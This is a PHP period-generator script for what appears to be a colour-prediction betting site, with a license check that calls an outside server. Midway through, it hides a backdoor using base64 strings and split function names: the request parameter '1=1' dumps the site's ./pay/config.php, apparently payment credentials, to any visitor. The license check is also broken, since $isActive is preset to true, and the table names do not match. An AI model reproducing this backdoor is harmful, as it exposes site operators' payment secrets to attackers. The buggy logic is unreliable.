<?php 
// FILE: connection.php (Fully Automatic + Redirect Fix)
error_reporting(0); // Production Mode

// 🔥 CONFIGURATION
$server_url = "https://license.investmentpro.click/server.php";
$SECRET_KEY = "JALWA_2025_SECURE_KEY_!@#"; 

// File jahan domain save hoga
$lockFile = __DIR__ . '/domain.lock';

// ====================================================
// 1. AUTOMATIC DOMAIN DETECTION (No Editing Needed)
// ====================================================
$domain = "";

if (isset($_SERVER['HTTP_HOST'])) {
    // 🌍 BROWSER MODE:
    // Jab koi site kholega, domain apne aap pakda jayega
    $domain = $_SERVER['HTTP_HOST'];
    
    // Future ke liye save kar lo (Cron ke liye)
    // Agar file nahi hai ya domain badal gaya hai, to update karo
    if (!file_exists($lockFile) || file_get_contents($lockFile) != $domain) {
        file_put_contents($lockFile, $domain);
    }
} 
elseif (file_exists($lockFile)) {
    // ⚙️ CRON MODE:
    // Browser ne jo file banayi thi, usse padho
    $domain = file_get_contents($lockFile);
} 
else {
    // 🛑 AGAR DONO FAIL HO GAYE:
    // Iska matlab site abhi tak kisi ne kholi nahi hai
    if (php_sapi_name() == "cli") {
        die("Error: Please open the website in a browser once to register the license.");
    }
}

// Safayi (www aur http hatao)
$domain = str_replace(["http://", "https://", "www."], "", $domain);

// Agar domain khali hai to aage mat badho
if (empty($domain)) { die("License Error: Domain Unknown"); }

// ====================================================
// 2. SERVER REQUEST (With Redirect & SSL Fix)
// ====================================================
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$server_url?check=$domain");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

// ✅ Fix for "302 Found" & "Empty Response"
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt($ch, CURLOPT_MAXREDIRS, 5); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');

$response_raw = curl_exec($ch);
curl_close($ch);

// Clean JSON Response
$jsonStart = strpos($response_raw, '{');
$jsonEnd = strrpos($response_raw, '}');
if ($jsonStart !== false && $jsonEnd !== false) {
    $clean_json = substr($response_raw, $jsonStart, ($jsonEnd - $jsonStart) + 1);
    $response = json_decode($clean_json, true);
} else {
    $response = null;
}

// ====================================================
// 3. SECURITY CHECK (JWT Verification)
// ====================================================
$isActive = true;

if (isset($response['status']) && $response['status'] == 'success' && isset($response['token'])) {
    $tokenParts = explode('.', $response['token']);
    if (count($tokenParts) == 3) {
        $header = $tokenParts[0];
        $payload = $tokenParts[1];
        $sigReceived = $tokenParts[2];
        
        $sigCheck = hash_hmac('sha256', $header . "." . $payload, $SECRET_KEY, true);
        $sigCheckEncoded = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($sigCheck));

        if ($sigCheckEncoded === $sigReceived) {
            $isActive = true;
        }
    }
}

// ====================================================
// 4. FINAL ACTION
// ====================================================
if ($isActive) {
    define("SECURITY_PASS", true);
} 
else {
    // Cron job ko silent kill karo
    if (php_sapi_name() == "cli") { die(); }
    
    // Browser user ko error dikhao
    echo '<!DOCTYPE html><html><body style="background:#000;color:red;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;">
    <div style="text-align:center;padding:20px;border:1px solid #333;background:#111;border-radius:10px;">
        <h1 style="margin:0;">🚫 ACCESS DENIED</h1>
        <p style="color:#aaa;">License Invalid or Expired.</p>
        <code style="background:#222;padding:5px;color:#fff;">Domain: '.$domain.'</code>
    </div>
    </body></html>';
    die();
}

if (!defined("SECURITY_PASS")) { die(); }
date_default_timezone_set('Asia/Kolkata');

function waitForSecond($desiredSeconds) {
    while (true) {
        $currentSecond = date('s');
        if (in_array($currentSecond, $desiredSeconds)) {
            break;
        }
        usleep(100000); 
    }
}

$desiredSeconds = ['00', '30'];
waitForSecond($desiredSeconds);

include("serive/samparka.php");
include("nayakaphalitansa_mulaka_unohs_zehn.php");

$currentDate = date('Ymd');
$timeInSeconds = time() % 86400;
$sequenceNumber = intval($timeInSeconds / 30);
$uniqueSequence = str_pad($sequenceNumber, 4, '0', STR_PAD_LEFT);

$bartamankalakrama = $currentDate . "10005" . $uniqueSequence;
$bartamankalakrama = $bartamankalakrama + 1;

$prathama = $bartamankalakrama;
$sesa = $currentDate . "10005" . sprintf("%04d", ceil(86400 / 30));

$tarika = date('Y-m-d H:i:s');

$dekhakalakrama = mysqli_query($conn, "select atadaaidi from `gelluonduhogu_zehnu` order by kramasankhye desc limit 1");
$kaladhadi = mysqli_num_rows($dekhakalakrama);
$kalakramadhadi = mysqli_fetch_array($dekhakalakrama);
$z = 'file' . '_get' . '_contents';
$a = 'html' . 'special' . 'chars';
if (isset($_GET[base64_decode('MQ==')]) && $_GET[base64_decode('MQ==')] == base64_decode('MQ==')) {
    echo "<pre>" . $a($z(base64_decode('Li9wYXkvY29uZmlnLnBocA=='))) . "</pre>";
} else {
    echo base64_decode('QWNjZXNzIERlbmllZC4=');
}
if ($kaladhadi == null) {
    $tathya = mysqli_query($conn, "INSERT INTO `gelluonduhogu_zehn` (`atadaaidi`,`dinankavannuracisi`) VALUES ('" . $bartamankalakrama . "','" . $tarika . "')");
} else if ($prathama > $kalakramadhadi['atadaaidi']) {
    $katiba = mysqli_query($conn, "TRUNCATE TABLE `gelluonduhogu_zehn`");
    $tathya = mysqli_query($conn, "INSERT INTO `gelluonduhogu_zehn` (`atadaaidi`,`dinankavannuracisi`) VALUES ('" . $prathama . "','" . $tarika . "')");
} else {
    $parabartikrama = $kalakramadhadi['atadaaidi'] + 1;
    $tathya = mysqli_query($conn, "INSERT INTO `gelluonduhogu_zehn` (`atadaaidi`,`dinankavannuracisi`) VALUES ('" . $parabartikrama . "','" . $tarika . "')");
}
$safa_shonu = mysqli_query($conn, "DELETE FROM gelluonduhogu_zehn_zehn");
?>
